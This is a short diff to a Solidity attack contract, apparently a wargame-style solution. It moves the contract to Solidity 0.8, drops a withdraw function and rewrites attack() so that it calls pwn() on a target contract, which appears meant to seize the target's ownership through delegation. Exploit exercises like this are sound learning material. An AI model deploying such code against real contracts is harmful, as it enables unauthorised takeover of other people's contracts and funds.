@@ -1,9 +1,10 @@
 // SPDX-License-Identifier: unlicensing
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract HackDelegate {
     address public target;
     address public owner;
+    error CallFailed();
 
     constructor(address _target) {
         target = _target;
@@ -15,11 +16,12 @@ contract HackDelegate {
         _;
     }
 
-    function withdraw() payable onlyOwner {
-        owner.transfer(this.balance);
-    }
-
-    function attack() public {
-        target.call(abi.encodeWithSignature("pwn()"));
+    function attack() public onlyOwner {
+        (bool success, bytes memory data) = target.call(
+            abi.encodeWithSignature("pwn()")
+        );
+        if(!success){
+            revert CallFailed();
+        }
     }
 }
